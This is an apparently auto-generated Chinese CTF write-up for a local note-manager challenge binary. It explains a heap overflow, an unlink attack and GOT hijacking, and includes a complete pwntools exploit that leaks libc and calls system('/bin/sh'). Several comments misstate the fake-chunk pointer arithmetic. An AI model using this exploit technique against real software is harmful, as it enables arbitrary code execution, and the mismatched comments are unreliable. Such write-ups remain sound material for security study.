# 漏洞利用文档

## 执行环境
基于exp脚本和程序分析，执行环境如下：
- **程序类型**：64位ELF二进制程序，使用动态链接（ldd显示依赖libc）
- **安全特性**（通过checksec推断）：
  - No PIE：全局变量地址固定（如ptr=0x6020C8）
  - Partial RELRO：GOT表可写
  - No Stack Canary：栈保护未启用
  - NX enabled：堆栈不可执行
- **运行依赖**：需要libc库，exp中使用`elf.libc`自动获取
- **调试环境**：使用pwntools在本地运行，context设置为debug模式

## 漏洞成因
### 关键结构体分析
程序使用以下全局变量管理堆块：
- `ptr`数组（0x6020C8）：存储7个堆块指针
- `qword_6020C0`数组：存储最后操作指针和每个堆块的大小（索引8-14）

### 漏洞分析
1. **堆溢出漏洞**：
   - 在`sub_4008DD`函数中，循环条件`a2 - 1 > i`允许写入`a2`字节，但实际分配大小可能小于`a2`
   - 当创建note 0时，`malloc(0)`实际分配33字节（最小chunk），但edit时使用存储大小256字节，导致堆溢出

2. **UAF潜在风险**：
   - delete操作后未完全清理指针，结合堆溢出可构造use-after-free

3. **类型混淆**：
   - `sub_4009B9`返回`__int64`，但索引计算使用`v0 % 7`，可能产生负数索引

## 漏洞利用过程
### 内存变化总结表
| 步骤 | 操作 | 堆布局变化 | 全局变量变化 | 关键效果 |
|------|------|------------|-------------|----------|
| 1 | 创建4个note | 分配chunk 0(33B)、chunk1-3(273B) | ptr[0-3]指向堆地址 | 准备堆布局 |
| 2 | edit note 0溢出 | 覆盖chunk1-3元数据，伪造chunk3 | 无变化 | 构造unlink攻击 |
| 3 | delete note 1 | chunk1进入unsorted bin，触发unlink | qword_6020C0[3]=0x6020C0 | 获得任意写能力 |
| 4 | edit note 2 | 修改全局指针指向GOT表 | ptr[0]=free_got, ptr[1-3]=atoi_got | 重定向指针 |
| 5 | edit note 0 | 修改free@got为puts_plt | free@got.plt=0x400730 | 劫持free函数 |
| 6 | delete note 2 | 触发puts泄漏atoi地址 | 获取atoi实际地址 | 计算libc基址 |
| 7 | edit note 3 | 修改atoi@got为system | atoi@got.plt=system_addr | 劫持atoi函数 |
| 8-9 | 发送"/bin/sh" | 无堆变化 | 无变化 | 触发system("/bin/sh") |
| 10 | interactive | 获得shell | 程序控制权获取 | 利用完成 |

### 详细利用链
1. **堆布局**：通过分配不同大小堆块创建可控内存布局
2. **元数据伪造**：利用堆溢出伪造chunk元数据，设置fd/bk指向全局变量
3. **Unlink攻击**：触发free时执行unlink操作，修改全局变量实现任意地址写
4. **GOT劫持**：通过修改的全局指针重写GOT表，先泄漏libc地址，再获取shell

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample16')
elf = ELF('./data/sample16')
libc = elf.libc

# 全局变量地址
ptr = 0x6020C8
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

def new(size, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'1')
    p.recvuntil(b'1024)\n')
    p.sendline(size)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def show():
    p.recvuntil(b'>>\n')
    p.sendline(b'2')

def edit(idx, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'3')
    p.recvuntil(b'note:\n')
    p.sendline(idx)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def delete(idx):
    p.recvuntil(b'>>\n')
    p.sendline(b'4')
    p.recvuntil(b'note:\n')
    p.sendline(idx)

# Step 1: 创建初始堆布局
new(b'0', b'aaaa')  # 分配最小chunk(33B)，为溢出准备
new(b'256', b'aaaa') # 正常chunk
new(b'256', b'aaaa') # 正常chunk  
new(b'256', b'aaaa') # 正常chunk

# Step 2: 堆溢出构造unlink攻击
# 计算伪造chunk的fd/bk指针，指向全局变量区域
fd = ptr + 0x10 - 0x18  # 指向qword_6020C0 - 0x18
bk = ptr + 0x10 - 0x10  # 指向ptr - 0x10
# 构造payload：伪造chunk元数据用于unlink攻击
payload = p64(0) * 3 + p64(0x121)  # 填充和伪造size
payload += b'a' * 0x110  # 填充数据区
payload += p64(0) + p64(0x101)  # 下一个chunk的prev_size和size
payload += p64(fd) + p64(bk)  # 伪造fd/bk指针
payload += b'a' * (0x100-0x20)  # 继续填充
payload += p64(0x100) + p64(0x110)  # 设置后续chunk的prev_size和size
edit(b'0', payload)  # 触发堆溢出

# Step 3: 触发unlink攻击
delete(b'1')  # free chunk1，触发unlink修改全局变量

# Step 4: 重定向全局指针到GOT表
payload = b'a' * 0x8  # 填充
payload += p64(free_got)  # 修改ptr[0]指向free@got
payload += p64(atoi_got) + p64(atoi_got) + p64(atoi_got)  # 修改其他指针指向atoi@got
edit(b'2', payload)

# Step 5: 劫持free@got为puts@plt
edit(b'0', p64(puts_plt)[:-1])  # 修改free@got指向puts，[:-1]处理字符串终止

# Step 6: 泄漏libc地址
delete(b'2')  # 触发free(实际调用puts)打印atoi地址
atoi_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))  # 接收并解析atoi地址
libc_addr = atoi_addr - libc.symbols['atoi']  # 计算libc基址
system_addr = libc.symbols['system'] + libc_addr  # 计算system地址

# Step 7: 劫持atoi@got为system
edit(b'3', p64(system_addr)[:-1])  # 修改atoi@got指向system

# Step 8-9: 触发system("/bin/sh")
p.recvuntil(b'>>\n')  # 等待菜单
p.sendline(b'/bin/sh')  # 发送/bin.sh，atoi实际调用system

# Step 10: 获取shell
p.interactive()  # 进入交互模式
```

### 关键注释说明
- **堆溢出构造**：通过精心构造的payload覆盖堆元数据，设置伪造chunk的fd/bk指向全局变量区域
- **Unlink攻击**：利用glibc的unlink宏修改全局变量，获得任意地址写入能力  
- **GOT劫持**：分两步：先劫持free为puts泄漏地址，再劫持atoi为system获取shell
- **地址计算**：通过泄漏的libc函数地址计算基址，绕过ASLR保护

此exp成功利用了堆溢出和unlink攻击，最终通过GOT劫持获得shell权限。
